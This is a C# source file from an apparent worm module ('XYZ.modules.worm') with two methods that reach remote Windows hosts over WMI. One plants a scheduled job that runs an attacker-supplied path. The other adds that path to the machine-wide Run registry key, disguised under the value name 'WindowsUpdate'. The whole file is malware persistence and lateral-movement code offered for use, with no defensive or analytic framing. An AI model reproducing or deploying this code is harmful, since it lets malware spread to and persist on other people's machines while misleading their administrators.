using System;
using System.Management;

namespace XYZ.modules.worm
{
    public class SMBPersistence
    {
        public bool CreateScheduledTaskViaSMB(string targetIP, string remotePath)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                options.Impersonation = ImpersonationLevel.Impersonate;
                options.Authentication = AuthenticationLevel.PacketPrivacy;
                
                ManagementScope scope = new ManagementScope("\\\\" + targetIP + "\\root\\default", options);
                scope.Connect();
                
                ManagementClass taskClass = new ManagementClass(scope, new ManagementPath("Win32_ScheduledJob"), null);
                
                ManagementBaseObject newTask = taskClass.GetMethodParameters("Create");
                newTask["Command"] = remotePath;
                newTask["DaysOfMonth"] = 0;
                newTask["DaysOfWeek"] = 0x7F;
                newTask["Flags"] = 0;
                newTask["Interactive"] = false;
                
                string timeFormat = DateTime.Now.AddMinutes(1).ToString("HHmmss.ffffff") + "+000";
                newTask["Time"] = timeFormat;
                
                ManagementBaseObject result = taskClass.InvokeMethod("Create", newTask, null);
                uint returnValue = (uint)result["ReturnValue"];
                
                return (returnValue == 0);
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool ModifyRegistryViaSMB(string targetIP, string remotePath)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions();
                options.Impersonation = ImpersonationLevel.Impersonate;
                options.Authentication = AuthenticationLevel.PacketPrivacy;
                
                ManagementScope scope = new ManagementScope("\\\\" + targetIP + "\\root\\default", options);
                scope.Connect();
                
                ManagementClass registry = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                
                ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                inParams["hDefKey"] = 0x80000002;
                inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
                inParams["sValueName"] = "WindowsUpdate";
                inParams["sValue"] = remotePath;
                
                ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
                
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}